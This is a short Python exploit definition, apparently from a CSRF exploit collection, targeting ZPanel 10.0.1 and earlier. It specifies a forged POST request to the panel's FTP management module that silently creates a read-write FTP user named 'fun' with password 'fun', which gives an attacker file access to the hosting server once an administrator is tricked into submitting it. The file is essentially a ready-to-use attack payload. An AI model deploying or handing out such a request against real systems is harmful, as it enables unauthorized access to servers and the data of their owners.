# -*- coding: utf-8 -*-

NAME = "ZPanel <= 10.0.1 CSRF"
DESCRIPTION = '''All sensitive functions are lacking CSRF protection. This exploit is a request showing no authorization token is required for the creation of a FTP user called "fun".'''

AUTHOR = "pcsjj"
DATE = "2012-11-04"

METHOD = "POST"
PATH = "/?module=ftp_management&action=CreateFTP"

PARAMS = [
    {
        "type": "hidden",
        "name": "inFTPUsername",
        "value": "fun",
        "custom": True,
        "description": "Username of the new user"
    },
    {
        "type": "hidden",
        "name": "inPassword",
        "value": "fun",
        "custom": True,
        "description": "Password of the new user"
    },
    {
        "type": "hidden",
        "name": "inAccess",
        "value": "RW",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "inAutoHome",
        "value": "2",
        "custom": False
    },
    {
        "type": "hidden",
        "name": "inDestination",
        "value": "",
        "custom": False
    },
    {
        "type": "submit",
        "name": "inSubmit",
        "value": "",
        "custom": False
    }
]